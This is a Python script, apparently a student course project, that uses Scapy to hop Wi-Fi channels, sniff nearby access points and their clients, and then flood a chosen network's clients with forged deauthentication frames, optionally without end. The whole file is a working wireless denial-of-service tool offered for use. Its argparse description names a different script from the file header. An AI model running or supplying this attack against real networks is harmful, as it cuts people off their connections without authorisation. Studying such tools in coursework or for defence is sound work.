#******
# Walt
# csc 842
# Date 27 Jul 24
# wifiDisco2.py
# Performa Wifi Deauth attacks ona provided BSSID
#******* 
import argparse
import logging
import os
import random
import signal
import sys
import time
from scapy.all import *
from threading import Thread, Event

# Suppress scapy runtime warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Channel hopper process
def channel_hopper(interface, stop_event):
    while not stop_event.is_set():
        channel = random.randint(1, 13)
        os.system(f"iwconfig {interface} channel {channel}")
        time.sleep(1)

# Signal handler to stop channel hopping
def stop_channel_hop(signal, frame):
    global stop_sniffing
    stop_sniffing = True
    stop_event.set()
    channel_hop.join()

# Function to add networks from sniffed packets
def add_network(pkt, known_networks, clients):
    if pkt.haslayer(Dot11Elt):
        essid = pkt[Dot11Elt].info.decode(errors='ignore') if b'\x00' not in pkt[Dot11Elt].info and pkt[Dot11Elt].info != b'' else 'Hidden SSID'
        bssid = pkt[Dot11].addr3
        if pkt.type == 0 and pkt.subtype == 8:  # Beacon frame
            try:
                channel = int(ord(pkt[Dot11Elt:3].info))
            except TypeError:
                channel = 'Unknown'
            if bssid not in known_networks:
                known_networks[bssid] = (essid, channel)
                print(f"{channel:5}\t{essid:30}\t{bssid:30}")
        if pkt.type == 2:  # Data frame
            if bssid in known_networks:
                client = pkt.addr1 if pkt.addr1 != bssid else pkt.addr2
                if bssid in clients:
                    clients[bssid].add(client)
                else:
                    clients[bssid] = {client}

# Sniffing filter to stop when signal is received
def keep_sniffing(pkt):
    return not stop_sniffing

# Function to send deauth packets
def send_deauth(client, bssid):
    packet = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
    send(packet, verbose=False)

# Perform Deauth Attack
def perform_deauth(bssid, clients, continuous):
    print(f'Sending Deauth to all clients from {bssid}')
    if continuous:
        print('Press CTRL+C to quit')
    while continuous or clients:
        try:
            threads = []
            for client in clients:
                t1 = Thread(target=send_deauth, args=(client, bssid))
                t2 = Thread(target=send_deauth, args=(bssid, client))
                t1.start()
                t2.start()
                threads.append(t1)
                threads.append(t2)
            for thread in threads:
                thread.join()
            if not continuous:
                break
        except KeyboardInterrupt:
            break

# Main execution
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='aircommand.py - Utilize many wireless security features using the Scapy python module')
    parser.add_argument('-i', '--interface', type=str, required=True, help='Interface to use for sniffing and packet injection')
    args = parser.parse_args()
    conf.iface = args.interface

    networks = {}
    clients = {}
    stop_sniffing = False
    stop_event = Event()

    print('Press CTRL+C to stop sniffing...')
    print('=' * 100 + '\n{0:5}\t{1:30}\t{2:30}\n'.format('Channel', 'ESSID', 'BSSID') + '=' * 100)

    channel_hop = Thread(target=channel_hopper, args=(args.interface, stop_event))
    channel_hop.start()
    signal.signal(signal.SIGINT, stop_channel_hop)

    sniff(lfilter=lambda x: (x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp) or x.haslayer(Dot11) and x.type == 2),
          stop_filter=keep_sniffing, prn=lambda x: add_network(x, networks, clients))

    signal.signal(signal.SIGINT, signal.SIG_DFL)

    target_bssid = input('Enter a BSSID to perform a deauth attack (q to quit): ')
    while target_bssid not in networks:
        if target_bssid == 'q':
            sys.exit(0)
        target_bssid = input('BSSID not detected... Please enter another (q to quit): ')

    print(f'Changing {args.interface} to channel {networks[target_bssid][1]}')
    os.system(f"iwconfig {args.interface} channel {networks[target_bssid][1]}")

    continuous = input('Perform continuous deauth attack? (y/n): ').strip().lower() == 'y'

    if target_bssid in clients:
        perform_deauth(target_bssid, clients[target_bssid], continuous)
    else:
        print('No clients found for the selected BSSID.')
